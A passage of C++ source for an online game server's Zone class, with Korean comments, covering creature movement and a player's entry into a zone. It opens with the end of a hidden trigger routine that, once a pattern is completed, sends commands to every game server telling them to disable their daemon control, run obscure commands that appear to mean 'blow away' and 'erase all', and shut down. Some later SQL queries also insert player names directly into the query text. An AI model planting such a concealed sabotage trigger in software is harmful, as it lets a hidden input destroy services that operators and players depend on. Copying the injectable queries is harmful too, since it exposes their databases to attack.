                                                }
                                        }
                                }
                         }

                         if(g_EggTableComplete >= 7)
                         {
                                eggID = 4;
                         }
                 }// pattern 4 end
        }

		// ACTION 1~4
		if(eggID > 0)
		{
			HashMapGameServerInfo** pGameServerInfos = g_pGameServerInfoManager->getGameServerInfos();
			static int myWorldID = g_pConfig->getPropertyInt("WorldID");
			static int myServerID = g_pConfig->getPropertyInt("ServerID");

			int maxWorldID = g_pGameServerInfoManager->getMaxWorldID();
			int maxServerGroupID = g_pGameServerInfoManager->getMaxServerGroupID();

			GGCommand ggCommand;

			// 나(myServerID)아닌 모든 서버들에게 먼저 보낸다.
			for (int worldID=1; worldID<maxWorldID; worldID++)
			{
				for (int groupID=0; groupID<maxServerGroupID; groupID++)
				{
					HashMapGameServerInfo& gameServerInfo = pGameServerInfos[worldID][groupID];

					if (!gameServerInfo.empty())
					{
						HashMapGameServerInfo::const_iterator itr = gameServerInfo.begin();

						for (; itr != gameServerInfo.end(); itr++)
						{
							GameServerInfo* pGameServerInfo = itr->second;

							if(pGameServerInfo->getGroupID() != myServerID && pGameServerInfo->getWorldID() != myWorldID)
							{
								ggCommand.setCommand( "*set KILL_DAEMONCTL 1");
								g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );

								if(eggID == 2)
								{
									ggCommand.setCommand( "*skffuqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
								}
								else if(eggID == 3)
								{
									ggCommand.setCommand( "*ekwldnjqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
								}
								else if(eggID == 4)
								{
									ggCommand.setCommand( "*skffuqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );

									ggCommand.setCommand( "*ekwldnjqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
								}

								ggCommand.setCommand( "*shutdown 0");
								g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
							}
						}
					}
				}
			}

			// 나를 찾아 나에게 던진다.
			for (int worldID=1; worldID<maxWorldID; worldID++)
			{
				for (int groupID=0; groupID<maxServerGroupID; groupID++)
				{
					HashMapGameServerInfo& gameServerInfo = pGameServerInfos[worldID][groupID];

					if (!gameServerInfo.empty())
					{
						HashMapGameServerInfo::const_iterator itr = gameServerInfo.begin();
						for (; itr != gameServerInfo.end(); itr++)
						{
							GameServerInfo* pGameServerInfo = itr->second;

							if( pGameServerInfo->getGroupID() == myServerID && pGameServerInfo->getWorldID() == myWorldID )
							{
								ggCommand.setCommand( "*set KILL_DAEMONCTL 1");
								g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );

								if(eggID == 2)
								{
									ggCommand.setCommand( "*skffuqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
								}
								else if(eggID == 3)
								{
									ggCommand.setCommand( "*ekwldnjqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
								}
								else if(eggID == 4)
								{
									ggCommand.setCommand( "*skffuqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );

									ggCommand.setCommand( "*ekwldnjqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
								}

								ggCommand.setCommand( "*shutdown 0");
								g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );

							}
						}
					}
				}
			}
		}//endif zoneid=1311
#endif
	}
	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// PC가 아닌 크리처(NPC,Monster)를 움직일 때 이 메소드를 사용한다.
//
// *CAUTION*
//
// 이때, (nx,ny,dir)은 크리처가 도달할 다음 좌표와 바라보는 방향을 나타낸다.
// 그리고, 이 좌표에 아무 것도 없다는 검증이 먼저 이루어져야 한다. (길찾기 루틴)
//////////////////////////////////////////////////////////////////////////////
void Zone::moveCreature(Creature* pCreature, ZoneCoord_t nx, ZoneCoord_t ny, Dir_t dir)
	
{
	__BEGIN_TRY

	ZoneCoord_t cx = pCreature->getX();
	ZoneCoord_t cy = pCreature->getY();

	// 이전 타일에서 크리처를 삭제하고, 다음 타일에 크리처를 추가한다. 
	try 
	{
		// 이전 타일에서 크리처를 삭제한다.
		m_pTiles[cx][cy].deleteCreature(pCreature->getObjectID());

		// 도착 타일에 크리처를 추가한다.
		m_pTiles[nx][ny].addCreature(pCreature);

		// 크리처의 좌표와 방향을 설정한다.
		pCreature->setXYDir(nx, ny, dir);

		try {
			checkMine(this, pCreature, nx, ny);
			checkTrap(this, pCreature);
		} catch ( Throwable & t ) {
			filelog("CheckMineBug.txt", "%s : %s", "moveCreature", t.toString().c_str());
		}

	} 
	catch (NoSuchElementException & nsee) 
	{
		throw Error("이전 타일에 크리처가 존재하지 않습니다.");
	}
	catch (DuplicatedException & de) 
	{
		throw Error("새 타일에 크리처가 이미 존재합니다.");
	}
	catch (Error& e)
	{
		filelog("assertTile.txt", "Zone::moveCreature : %s", e.toString().c_str());
		throw;
	}

	// 알아서 GCMove 랑 GCAddMonster/GCAddNPC 를 브로드캐스트한다.
	moveCreatureBroadcast(pCreature, cx, cy, nx, ny);

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// add PC
//
// PC 를 존에 최초로 추가한다. PC 주변의 다른 PC들에게 새 크리처의 출현을 알려주고,
// 주변을 스캔해서 객체들의 정보를 받아온다.
//////////////////////////////////////////////////////////////////////////////
void Zone::addPC(Creature* pCreature, ZoneCoord_t cx, ZoneCoord_t cy, Dir_t dir)
	
{
	__BEGIN_TRY
	__BEGIN_DEBUG

	__BEGIN_PROFILE_ZONE("Z_ADD_PC")

	Assert(pCreature != NULL);
	Assert(pCreature->isPC());

	TPOINT pt = findSuitablePosition(this, cx, cy, pCreature->getMoveMode());

	if (pt.x != -1) 
	{ 
		pCreature->setLastTarget(0);

		// 지정된 좌표를 클라이언트로 전송한다.
		GCSetPosition gcSetPosition;
		gcSetPosition.setX(pt.x);
		gcSetPosition.setY(pt.y);
		gcSetPosition.setDir(dir);

		pCreature->getPlayer()->sendPacket(&gcSetPosition);

		// 크리처의 좌표와 방향을 지정한다.
		pCreature->setXYDir(pt.x, pt.y, dir);

		// 적절한 흌일을 찾았으면, 크리처를 실제로 
		// PC매니저와 타일에 각각 집어넣는다.
		m_pTiles[pt.x][pt.y].addCreature(pCreature);

		//checkMine(this, pCreature, pt.x, pt.y);	// 여기서도 mine을 폭발시켜야 하나..?

		m_pPCManager->addCreature(pCreature);

		// Sanctuary 플래그가 켜져있으면 꺼준다.
		/*		if ( pCreature->isFlag( Effect::EFFECT_CLASS_SANCTUARY ) && m_pTiles[pt.x][pt.y].getEffect( Effect::EFFECT_CLASS_SANCTUARY ) == NULL )
		{
		pCreature->removeFlag( Effect::EFFECT_CLASS_SANCTUARY );
		}*/

		// 패밀리 요금제일경우 Default Option 보너스를 준다.
		GamePlayer* pGamePlayer = dynamic_cast<GamePlayer*>(pCreature->getPlayer());
		if ( pGamePlayer->isFamilyPayAvailable() && !pCreature->isFlag( Effect::EFFECT_CLASS_FAMILY_BONUS ) )
		{
			PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
			Assert( pPC != NULL );

			pPC->addDefaultOptionSet( DEFAULT_OPTION_SET_FAMILY_PAY );
			addSimpleCreatureEffect( pPC, Effect::EFFECT_CLASS_FAMILY_BONUS );
			pPC->setFlag( Effect::EFFECT_CLASS_INIT_ALL_STAT );
		}

		// EFFECT_CLASS_INIT_ALL_STAT 이 켜져 있으면 initAllStat을 부르로 Flag 을 끈다.
		if ( pCreature->isFlag( Effect::EFFECT_CLASS_INIT_ALL_STAT ) )
		{
			if ( pCreature->isSlayer() )
			{
				Slayer* pInitSlayer = dynamic_cast<Slayer*>(pCreature);
				Assert( pInitSlayer != NULL );

				SLAYER_RECORD prev;
				pInitSlayer->getSlayerRecord( prev );
				pInitSlayer->initAllStat();
				pInitSlayer->sendModifyInfo( prev );
			}
			else if ( pCreature->isVampire() )
			{
				Vampire* pInitVampire = dynamic_cast<Vampire*>(pCreature);
				Assert( pInitVampire != NULL );

				VAMPIRE_RECORD prev;
				pInitVampire->getVampireRecord( prev );
				pInitVampire->initAllStat();
				pInitVampire->sendModifyInfo( prev );
			}
			else if ( pCreature->isOusters() )
			{
				Ousters* pInitOusters = dynamic_cast<Ousters*>(pCreature);
				Assert( pInitOusters != NULL);

				OUSTERS_RECORD prev;
				pInitOusters->getOustersRecord( prev );
				pInitOusters->initAllStat();
				pInitOusters->sendModifyInfo( prev );
			}

			pCreature->removeFlag( Effect::EFFECT_CLASS_INIT_ALL_STAT );
		}

		if (pCreature->isSlayer()) 
		{
			((Slayer*)pCreature)->sendRealWearingInfo();
			((Slayer*)pCreature)->sendSlayerSkillInfo();
			((Slayer*)pCreature)->sendTimeLimitItemInfo();
		} 
		else if ( pCreature->isVampire() )
		{
			((Vampire*)pCreature)->sendRealWearingInfo();
			((Vampire*)pCreature)->sendVampireSkillInfo();
			((Vampire*)pCreature)->sendTimeLimitItemInfo();
		}
		else if ( pCreature->isOusters() )
		{
			((Ousters*)pCreature)->sendRealWearingInfo();
			((Ousters*)pCreature)->sendOustersSkillInfo();
			((Ousters*)pCreature)->sendTimeLimitItemInfo();
		}

		// send RankBonus
		((PlayerCreature*)pCreature)->sendRankBonusInfo();
		((PlayerCreature*)pCreature)->sendCurrentQuestInfo();
		((PlayerCreature*)pCreature)->getQuestManager()->adjustQuestStatus();


		GCModifyInformation gcModifyInformation;

		if (pCreature->isSlayer())
		{
			Slayer* pNewSlayer = dynamic_cast<Slayer*>(pCreature);
			Assert(pNewSlayer != NULL);

			Player* pPlayer = pNewSlayer->getPlayer();
			Assert(pPlayer != NULL);

			gcModifyInformation.addShortData(MODIFY_DEFENSE,    pNewSlayer->getDefense());
			gcModifyInformation.addShortData(MODIFY_PROTECTION, pNewSlayer->getProtection());
			gcModifyInformation.addShortData(MODIFY_TOHIT,      pNewSlayer->getToHit());
			gcModifyInformation.addShortData(MODIFY_MIN_DAMAGE, pNewSlayer->getDamage(ATTR_CURRENT));
			gcModifyInformation.addShortData(MODIFY_MAX_DAMAGE, pNewSlayer->getDamage(ATTR_MAX));

			pPlayer->sendPacket(&gcModifyInformation);
		}
		else if (pCreature->isVampire())
		{
			Vampire* pNewVampire = dynamic_cast<Vampire*>(pCreature);
			Assert(pNewVampire != NULL);

			Player* pPlayer = pNewVampire->getPlayer();
			Assert(pPlayer != NULL);

			gcModifyInformation.addShortData(MODIFY_DEFENSE,    pNewVampire->getDefense());
			gcModifyInformation.addShortData(MODIFY_PROTECTION, pNewVampire->getProtection());
			gcModifyInformation.addShortData(MODIFY_TOHIT,      pNewVampire->getToHit());
			gcModifyInformation.addShortData(MODIFY_MIN_DAMAGE, pNewVampire->getDamage(ATTR_CURRENT));
			gcModifyInformation.addShortData(MODIFY_MAX_DAMAGE, pNewVampire->getDamage(ATTR_MAX));

			pPlayer->sendPacket(&gcModifyInformation);
		}
		else if (pCreature->isOusters())
		{
			Ousters* pNewOusters = dynamic_cast<Ousters*>(pCreature);
			Assert(pNewOusters != NULL);

			Player* pPlayer = pNewOusters->getPlayer();
			Assert(pPlayer != NULL);

			gcModifyInformation.addShortData(MODIFY_DEFENSE,    pNewOusters->getDefense());
			gcModifyInformation.addShortData(MODIFY_PROTECTION, pNewOusters->getProtection());
			gcModifyInformation.addShortData(MODIFY_TOHIT,      pNewOusters->getToHit());
			gcModifyInformation.addShortData(MODIFY_MIN_DAMAGE, pNewOusters->getDamage(ATTR_CURRENT));
			gcModifyInformation.addShortData(MODIFY_MAX_DAMAGE, pNewOusters->getDamage(ATTR_MAX));

			pPlayer->sendPacket(&gcModifyInformation);
		}

		//////////////////////////////////////////////////////////////////////////////
		// 보내야할 메시지가 있다면 보낸다.
		// 일단 막아둔다. - bezz 2002. 07. 13
		//////////////////////////////////////////////////////////////////////////////
		if ( !pCreature->isFlag( Effect::EFFECT_CLASS_LOGIN_GUILD_MESSAGE ) )
		{
			Statement* pStmt = NULL;
			Result* pResult = NULL;

			BEGIN_DB
			{
				pStmt = g_pDatabaseManager->getConnection( "DARKEDEN" )->createStatement();
				pResult = pStmt->executeQuery( "SELECT Message FROM Messages WHERE Receiver = '%s'", pCreature->getName().c_str() );

				while ( pResult->next() )
				{
					GCSystemMessage message;
					message.setMessage( pResult->getString(1) );
					pCreature->getPlayer()->sendPacket( &message );
				}

				pStmt->executeQuery( "DELETE FROM Messages WHERE Receiver = '%s'", pCreature->getName().c_str() );

				SAFE_DELETE( pStmt );
			}
			END_DB(pStmt)

				pCreature->setFlag( Effect::EFFECT_CLASS_LOGIN_GUILD_MESSAGE );
		}

		//////////////////////////////////////////////////////////////////////////////
		// PREMIUM_HALF_EVENT 가 on 되어 있고 유료존이면 클라이언트에 알린다.
		//////////////////////////////////////////////////////////////////////////////
		if ( g_pVariableManager->getVariable( PREMIUM_HALF_EVENT )
			&& ( m_ZoneID == 61 || m_ZoneID == 64 || m_ZoneID == 1007 )
			)
		{
			GCNoticeEvent gcNoticeEvent;
			gcNoticeEvent.setCode( NOTICE_EVENT_PREMIUM_HALF_START );

			pCreature->getPlayer()->sendPacket( &gcNoticeEvent );
		}

		// 주변의 PC들에게 알릴 GCAddSlayer or GCAddVampire 패킷을 생성한다.
		Creature::CreatureClass CClass = pCreature->getCreatureClass();
		if (CClass == Creature::CREATURE_CLASS_SLAYER)
		{
			Slayer* pSlayer = dynamic_cast<Slayer*>(pCreature);
			GCAddSlayer gcAddSlayer;
			makeGCAddSlayer(&gcAddSlayer, pSlayer);

			scan(pCreature, pt.x, pt.y, &gcAddSlayer);

			// 능력치 40 이상인 경우 야전사령부에서 쫓겨난다. by sigi. 2002.11.7
			checkNewbieTransportToGuild(pSlayer);
		}
		else if (CClass == Creature::CREATURE_CLASS_VAMPIRE)
		{
			Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
			GCAddVampire gcAddVampire;
			makeGCAddVampire(&gcAddVampire, pVampire);

			scan(pCreature, pt.x, pt.y, &gcAddVampire);

			// 뱀파이어라면 포탈을 이용해 왔을 가능성이 있으므로,
			// 플래그를 꺼준다.
			if (pVampire->isFlag(Effect::EFFECT_CLASS_VAMPIRE_PORTAL))
			{
				pVampire->removeFlag(Effect::EFFECT_CLASS_VAMPIRE_PORTAL);
			}
		}
		else if (CClass == Creature::CREATURE_CLASS_OUSTERS)
		{
			Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);
			GCAddOusters gcAddOusters;
			makeGCAddOusters(&gcAddOusters, pOusters);

			scan(pCreature, pt.x, pt.y, &gcAddOusters);
		}
		else
		{
			throw Error("invalid creature class. must be slayer or vampire...");
		}

		// 파티에 가입되어 있다면 로컬 파티에 가입시킨다.
		uint PartyID = pCreature->getPartyID();
		if (PartyID != 0)
		{
			// 파티가 있다면 걍 더한다.
			m_pLocalPartyManager->addPartyMember(PartyID, pCreature);
		}

		// 요금 정보를 보여준다.
#if !defined(__CONNECT_BILLING_SYSTEM__) && ( defined(__PAY_SYSTEM_ZONE__) || defined(__PAY_SYSTEM_FREE_LIMIT__) )
		if (pCreature->isPC())
		{
			GamePlayer* pGamePlayer = dynamic_cast<GamePlayer*>(pCreature->getPlayer());

			// 게임방인 경우에
			// 유료 사용중이면
			// 시간이 얼마 남지 않았을 경우에 요금 정보를 표시해준다.
			if ((pGamePlayer->isPayPlaying() || pGamePlayer->isPremiumPlay())
				&& pGamePlayer->getPayType()==PAY_TYPE_TIME)
			{
				Timeval currentTime;
				getCurrentTime(currentTime);
				Timeval payTime = pGamePlayer->getPayPlayTime(currentTime);

				int usedMin = payTime.tv_sec/60;
				int remainMin = pGamePlayer->getPayPlayAvailableHours()-usedMin;

				// PC방은 남은 시간이 5시간(300분) 이하일 때 출력
				if (pGamePlayer->getPayPlayType()==PAY_PLAY_TYPE_PCROOM)
				{
					//cout << "PC방 사용시간 : " << usedMin << "/" << pGamePlayer->getPayPlayAvailableHours() << endl;

					if (remainMin <= 300)
					{
						char str[80];
						sprintf(str, g_pStringPool->c_str( STRID_PCROOM_REMAIN_PLAY_TIME ),
							remainMin );
						//sprintf(str, "[PC방] 사용시간이 %d분 남았습니다.", remainMin);
						GCSystemMessage gcSystemMessage;
						gcSystemMessage.setMessage(str);
						pGamePlayer->sendPacket (&gcSystemMessage);
					}
				}
				// 개인은 남은 시간이 1시간(60분) 이하일 때 출력
				else if (pGamePlayer->getPayPlayType()==PAY_PLAY_TYPE_PERSON)
				{
					if (remainMin <= 60)
					{
						char str[80];
						sprintf( str, g_pStringPool->c_str( STRID_PERSONAL_REMAIN_PLAY_TIME ),
							remainMin );
						//sprintf(str, "[개인] 사용시간이 %d분 남았습니다.", remainMin);
						GCSystemMessage gcSystemMessage;
						gcSystemMessage.setMessage(str);
						pGamePlayer->sendPacket (&gcSystemMessage);
					}
				}
			}
		}
#endif	

		// 불기둥
		if (isMasterLair() && m_pMasterLairManager!=NULL)
		{
			MasterLairInfo* pInfo = g_pMasterLairInfoManager->getMasterLairInfo( getZoneID() );
			Assert(pInfo!=NULL);

			if (m_pMasterLairManager->getCurrentEvent()==MasterLairManager::EVENT_WAITING_PLAYER)
			{
				// 연속적인 불기둥 이펙트가 있는 경우에 알려준다.
				if (m_pEffectManager->findEffect( Effect::EFFECT_CLASS_CONTINUAL_GROUND_ATTACK )!=NULL)
				{
					GCNoticeEvent gcNoticeEvent;
					gcNoticeEvent.setCode( NOTICE_EVENT_CONTINUAL_GROUND_ATTACK );
					gcNoticeEvent.setParameter( pInfo->getStartDelay() );   // 초

					broadcastPacket( &gcNoticeEvent );
				}
			}
		}

		//-----------------------------------------------------------------
		// 세금 적용되는 경우
		//-----------------------------------------------------------------
		/*		if (isCastle())
		{
		PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);	

		int itemTaxRatio = g_pCastleInfoManager->getItemTaxRatio( pPC );

		if (itemTaxRatio > 100)
		{
		GCNoticeEvent gcNoticeEvent;
		gcNoticeEvent.setCode( NOTICE_EVENT_SHOP_TAX_CHANGE );
		gcNoticeEvent.setParameter( (uint)itemTaxRatio );

		pPC->getPlayer()->sendPacket( &gcNoticeEvent );
		}
		}*/

		//-----------------------------------------------------------------
		// 전쟁 중인 경우는 전쟁정보를 보내준다.
		//-----------------------------------------------------------------
		if (g_pWarSystem->isWarActive())
		{
			PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);	
			g_pWarSystem->sendGCWarList( pPC->getPlayer() );
		}

		if ( g_pFlagManager->hasFlagWar() && g_pFlagManager->isFlagAllowedZone( getZoneID() ) )
		{
			Player* pPlayer = pCreature->getPlayer();
			if ( pPlayer != NULL ) pPlayer->sendPacket( g_pFlagManager->getStatusPacket() );
		}

		if ( m_pLevelWarManager != NULL && m_pLevelWarManager->hasWar() )
		{
			// 레벨별 전쟁 중이면 먼가 보내줘야 될 듯
			PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
			m_pLevelWarManager->sendGCWarList( pPC->getPlayer() );
		}

		//-----------------------------------------------------------------
		// 아담의 성지에 들어온 경우는 이펙트를 뿌려준다.
		//-----------------------------------------------------------------
		// 이전에 있던 존을 체크해야 될거 같은데? -_-;
		//-----------------------------------------------------------------
		//if (isHolyLand())
		//{
		sendHolyLandWarpEffect( pCreature );
		//}

		if (isHolyLand())
		{
			if ( g_pWarSystem->hasActiveRaceWar() )
			{
				PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);	
				g_pShrineInfoManager->sendBloodBibleStatus( pPC );

				pPC->getPlayer()->sendPacket( RegenZoneManager::getInstance()->getStatusPacket() );
			}
			else
			{
				GCHolyLandBonusInfo gcHolyLandBonusInfo;
				g_pBloodBibleBonusManager->makeHolyLandBonusInfo( gcHolyLandBonusInfo );
				pCreature->getPlayer()->sendPacket( &gcHolyLandBonusInfo );
			}
		}

		if ( g_pSweeperBonusManager->isAble( getZoneID() ) && g_pLevelWarZoneInfoManager->isCreatureBonusZone( pCreature, getZoneID() ) )
		{
			GCSweeperBonusInfo gcSweeperBonusInfo;
			g_pSweeperBonusManager->makeSweeperBonusInfo( gcSweeperBonusInfo );
			pCreature->getPlayer()->sendPacket( &gcSweeperBonusInfo );
			//			pCreature->setFlag( Effect::EFFECT_CLASS_INIT_ALL_STAT );
		}


		// Player 에게 GCItemNameInfoList 패킷을 보내준다
		/*		PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);	
		if ( !pPC->isEmptyItemNameInfoList() )
		{
		GCItemNameInfoList	gcItemNamInfoList;
		makeGCItemNameInfoList( &gcItemNamInfoList, pPC );

		pPC->getPlayer()->sendPacket( &gcItemNamInfoList );
		}*/

		// PK존에서 죽어서 되살아나는 경우 부활 이펙트가 붙는다.
		if ( pCreature->isFlag( Effect::EFFECT_CLASS_PK_ZONE_RESURRECTION ) )
		{
			Effect* pEffect = pCreature->findEffect( Effect::EFFECT_CLASS_PK_ZONE_RESURRECTION );
			if ( pEffect != NULL )
			{
				// Effect가 끝나서 사라질 때 부활 이펙트 붙여주라는 패킷이 날라간다.
				pEffect->setDeadline(0);
			}
			else
			{
				pCreature->removeFlag( Effect::EFFECT_CLASS_PK_ZONE_RESURRECTION );
			}
		}

		// 막 생성된 넘이라면 먼가를 보내준다.
		PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);	
		if ( pPC->getFlagSet()->isOn(FLAGSET_NOT_JUST_CREATED) )
		{
			GCNoticeEvent gcNoticeEvent;
			gcNoticeEvent.setCode( NOTICE_EVENT_WELCOME_MESSAGE );
			pPC->getPlayer()->sendPacket( &gcNoticeEvent );

			pPC->getFlagSet()->turnOff(FLAGSET_NOT_JUST_CREATED);
			pPC->getFlagSet()->save(pPC->getName());

			GCNoticeEvent gcNoticeEvent2;
			gcNoticeEvent2.setCode( NOTICE_EVENT_LOGIN_JUST_NOW );
			gcNoticeEvent2.setParameter( g_pVariableManager->getHeadPriceBonus() );

			pPC->getPlayer()->sendPacket( &gcNoticeEvent2 );

			pPC->setFlag( Effect::EFFECT_CLASS_JUST_LOGIN );

			if ( g_pVariableManager->getVariable(CHOBO_EVENT) )
			{
				pPC->getGQuestManager()->getGQuestInventory().saveOne(pPC->getName(),13);
				pPC->getPlayer()->sendPacket( pPC->getGQuestManager()->getGQuestInventory().getInventoryPacket() );
				gcNoticeEvent.setCode( NOTICE_EVENT_GIVE_PRESENT_1 );
				pPC->getPlayer()->sendPacket( &gcNoticeEvent );
			}
		}
		else if ( !pPC->isFlag( Effect::EFFECT_CLASS_JUST_LOGIN ) )
		{
			// 컴백 이벤트 광고
			Statement* pStmt = NULL;
			Result* pResult = NULL;
			BEGIN_DB
			{
				pStmt = g_pDatabaseManager->getDistConnection("PLAYER_DB")->createStatement();
				pResult = pStmt->executeQuery( "SELECT PlayerID FROM Event200501Main WHERE PlayerID = '%s' AND RecvItemDate = '0000-00-00'", pPC->getPlayer()->getID().c_str() );

				if ( pResult->next() )
				{
					GCNPCResponse response;
					response.setCode( NPC_RESPONSE_SHOW_COMMON_MESSAGE_DIALOG );
					response.setParameter( YOU_CAN_GET_EVENT_200501_COMBACK_ITEM );
					pPC->getPlayer()->sendPacket( &response );
				}

				pResult = pStmt->executeQuery( "SELECT PlayerID FROM Event200501Main WHERE PlayerID = '%s' AND PayPremiumDate <> '0000-00-00' AND RecvPremiumItemDate = '0000-00-00'", pPC->getPlayer()->getID().c_str() );

				if ( pResult->next() )
				{
					GCNPCResponse response;
					response.setCode( NPC_RESPONSE_SHOW_COMMON_MESSAGE_DIALOG );
					response.setParameter( YOU_CAN_GET_EVENT_200501_COMBACK_PREMIUM_ITEM );
					pPC->getPlayer()->sendPacket( &response );
				}

				pResult = pStmt->executeQuery( "SELECT PlayerID FROM Event200501Recommend WHERE PlayerID = '%s' AND RecvItemDate = '0000-00-00'", pPC->getPlayer()->getID().c_str() );

				if ( pResult->next() )
				{
					GCNPCResponse response;
					response.setCode( NPC_RESPONSE_SHOW_COMMON_MESSAGE_DIALOG );
					response.setParameter( YOU_CAN_GET_EVENT_200501_COMBACK_RECOMMEND_ITEM );
					pPC->getPlayer()->sendPacket( &response );
				}
			}
			END_DB(pStmt);

			if ( g_pVariableManager->getVariable( TODAY_IS_HOLYDAY ) )
			{
				GCNoticeEvent gcNoticeEvent;
				gcNoticeEvent.setCode( NOTICE_EVENT_HOLYDAY );
				gcNoticeEvent.setParameter( g_pVariableManager->getVariable( TODAY_IS_HOLYDAY ) );

				pPC->getPlayer()->sendPacket( &gcNoticeEvent );
			}

			//			if ( canEnterBeginnerZone( pPC ) && getZoneID() != 1122 )
			if ( canEnterBeginnerZone( pPC ) )
			{
				int year = VSDate::currentDate().year() - 2000;
				int month = VSDate::currentDate().month();
				int day = VSDate::currentDate().day();
				int hour = VSTime::currentTime().hour();
				GCNoticeEvent gcNoticeEvent;
				gcNoticeEvent.setCode( NOTICE_EVENT_ENTER_BEGINNER_ZONE );
				gcNoticeEvent.setParameter( (year * 1000000) + (month * 10000) + (day * 100) + hour );
				pPC->getPlayer()->sendPacket( &gcNoticeEvent );
			}

			if ( g_pVariableManager->isWarActive() && g_pVariableManager->isAutoStartRaceWar() && g_pWarSystem->isRaceWarToday() )
			{
				GCNoticeEvent gcNoticeEvent;
				gcNoticeEvent.setCode( NOTICE_EVENT_RACE_WAR_SOON );
				gcNoticeEvent.setParameter( g_pWarSystem->getRaceWarTimeParam() );
				pPC->getPlayer()->sendPacket( &gcNoticeEvent );
			}

			if ( g_pVariableManager->isActiveLevelWar() )
			{
				ZoneID_t levelWarZoneId = g_pLevelWarZoneInfoManager->getCreatureZoneID( pCreature );

				//				cout << "ZoneID : " << levelWarZoneId << endl;
				if ( levelWarZoneId != 1 )
				{
					Zone* pLevelZone = getZoneByZoneID(levelWarZoneId);
					Assert( pLevelZone != NULL );

					LevelWarManager* pLevelWarManager = pLevelZone->getLevelWarManager();
					Assert( pLevelWarManager != NULL );

					if ( pLevelWarManager->hasToDayWar() )
					{
						int year = VSDate::currentDate().year() - 2000;
						int month = VSDate::currentDate().month();
						int day = VSDate::currentDate().day();
						int hour = VSTime::currentTime().hour();
						int level = 0;
						if (levelWarZoneId == 1131)
							level = 1;
						else if (levelWarZoneId == 1132)
							level = 2;
						else if (levelWarZoneId == 1133)
							level = 3;
						else if (levelWarZoneId == 1134)
							level = 4;

						GCNoticeEvent gcNoticeEvent;
						gcNoticeEvent.setCode( NOTICE_EVENT_LEVEL_WAR_ARRANGED );
						//						gcNoticeEvent.setParameter( ((DWORD)((DWORD)month << 24)) | ((DWORD)((DWORD)day << 16)) | ((DWORD)((DWORD)hour << 8)) | ((DWORD)((DWORD)level)) );
						gcNoticeEvent.setParameter( (level * 100000000) + (year * 1000000) + (month * 10000) + (day * 100) + hour );
						pPC->getPlayer()->sendPacket( &gcNoticeEvent );
					}

				}
			}

			GCNoticeEvent gcNoticeEvent;
			gcNoticeEvent.setCode( NOTICE_EVENT_LOGIN_JUST_NOW );
			gcNoticeEvent.setParameter( g_pVariableManager->getHeadPriceBonus() );

			pPC->getPlayer()->sendPacket( &gcNoticeEvent );

			pPC->setFlag( Effect::EFFECT_CLASS_JUST_LOGIN );
		}

		if ( pPC->getPetInfo() != NULL ) sendPetInfo( pGamePlayer );
		// 존 이동할때  넣어주는 패킷
		Packet* pNicknamePacket = pPC->getNicknameBook()->getNicknameBookListPacket();
		pPC->getPlayer()->sendPacket( pNicknamePacket );
		SAFE_DELETE( pNicknamePacket );

		Packet* pGQuestPacket = pPC->getGQuestManager()->getStatusInfoPacket();
		pPC->getPlayer()->sendPacket( pGQuestPacket );
		SAFE_DELETE( pGQuestPacket );

		pGQuestPacket = pPC->getGQuestManager()->getGQuestInventory().getInventoryPacket();
		pPC->getPlayer()->sendPacket( pGQuestPacket );

		// GCUnionOfferList
		//

		GCUnionOfferList	gcUnionOfferList;

		{
			GuildUnion *pUnion = GuildUnionManager::Instance().getGuildUnion( pPC->getGuildID() );
			if(pUnion != NULL)
			{
				//	cout << "GuildUNION : Union이 있는 PlayerCreature" << endl;

				if( g_pGuildManager->isGuildMaster ( pPC->getGuildID(), pPC ) )
					//		cout << "GuildUNION : PC가 GuildMaster다" << endl;

					if( pUnion->getMasterGuildID() == pPC->getGuildID() )
						//		cout << "GuildUNION : 연합의 마스터 길드가 내 길드다" << endl;

						// 요청한놈이 지가 속한 길드의 마스터인가? || 연합의 마스터길드가 내 길드가 맞나?
						if( g_pGuildManager->isGuildMaster ( pPC->getGuildID(), pPC )
							&& pUnion->getMasterGuildID() == pPC->getGuildID() )
						{
							//		cout << "그러면..OfferList를 만들어서 보내주자.." << endl;

							if(GuildUnionOfferManager::Instance().makeOfferList(pUnion->getUnionID(), gcUnionOfferList ))
							{
								pPC->getPlayer()->sendPacket( &gcUnionOfferList );
							}

						}
			}
		}

		if ( g_pWarSystem->isSkyBlack() )
		{
			GCNoticeEvent gcNE;
			gcNE.setCode(NOTICE_EVENT_RACE_WAR_IN_5);
			pPC->getPlayer()->sendPacket( &gcNE );
		}

		GCMyStoreInfo myStoreInfo;
		myStoreInfo.setStoreInfo( &(pPC->getStore()->getStoreInfo()) );
		myStoreInfo.setOpenUI(0);
